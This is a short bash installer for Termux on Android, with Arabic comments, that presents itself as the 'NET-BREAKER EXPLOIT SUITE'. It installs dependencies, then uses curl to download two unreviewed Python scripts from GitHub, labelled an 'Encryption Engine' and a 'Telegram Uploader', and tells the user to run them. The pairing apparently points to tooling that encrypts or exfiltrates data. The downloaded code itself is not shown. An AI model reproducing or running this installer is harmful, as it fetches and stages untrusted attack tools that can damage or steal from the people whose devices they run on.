#!/data/data/com.termux/files/usr/bin/bash

# واجهة الهكر السيبرانية
echo -e "\033[94m==================================================\033[0m"
echo -e "\033[92m   [ NET-BREAKER EXPLOIT SUITE - INSTALLER ]\033[0m"
echo -e "\033[94m==================================================\033[0m"

# تحديث وتثبيت الحزم الأساسية
echo -e "\033[93m[*] Initializing environment & installing dependencies...\033[0m"
pkg update -y && pkg upgrade -y
pkg install python p7zip curl -y
pip install requests

# إنشاء مجلد العمل الخاص بالأدوات
WORK_DIR="$HOME/NetBreaker"
mkdir -p "$WORK_DIR"
cd "$WORK_DIR"

# تحميل الأداة الأولى (التشفير)
echo -e "\033[93m[*] Downloading Tool 1 (Encryption Engine from o0)...\033[0m"
if [ ! -f encrypt.py ]; then
    curl -L https://raw.githubusercontent.com/fcfdfc655-sys/o0/main/main.py -o encrypt.py
    echo -e "\033[92m   [+] encrypt.py downloaded successfully.\033[0m"
fi

# تحميل الأداة الثانية (الإرسال والتليجرام)
echo -e "\033[93m[*] Downloading Tool 2 (Telegram Uploader from P0)...\033[0m"
if [ ! -f upload.py ]; then
    curl -L https://raw.githubusercontent.com/fcfdfc655-sys/P0/main/main.py -o upload.py
    echo -e "\033[92m   [+] upload.py downloaded successfully.\033[0m"
fi

# رسالة النجاح النهائية
echo -e "\033[92m"
echo "=================================================="
echo " ✅ تم تثبيت الأداتين بنجاح داخل مجلد: NetBreaker"
echo "=================================================="
echo " 🚀 أوامر التشغيل داخل المجلد:"
echo "   1. لتشغيل أداة التشفير: python encrypt.py"
echo "   2. لتشغيل أداة الرفع:   python upload.py"
echo "=================================================="
echo -e "\033[0m"

